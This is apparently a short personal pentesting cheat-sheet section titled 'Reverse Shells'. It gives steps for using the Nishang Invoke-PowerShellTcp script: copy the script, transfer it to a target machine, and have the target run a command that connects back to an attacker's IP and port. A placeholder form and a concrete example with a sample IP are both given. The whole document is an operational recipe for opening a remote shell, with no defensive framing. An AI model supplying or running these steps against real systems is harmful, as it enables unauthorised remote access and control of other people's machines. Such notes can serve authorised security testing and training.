# Reverse Shells

* [Nishang Invoke PowerShell TCP](#nishang-invoke-powershell-tcp)
* 


## Nishang Invoke PowerShell TCP

1. Paste this nishang file into a blank text document: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
2. Name it "Invoke-PowerShellTcp.ps1" (remove quotes)
3. Transfer the newly created file to the target machine by any means
4. Have the target machine trigger this command:
```
Invoke-PowerShellTcp -Reverse -IPAddress [ATTACK-IP] -Port [PORT]
```
Example: 
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.69 -Port 8686
```
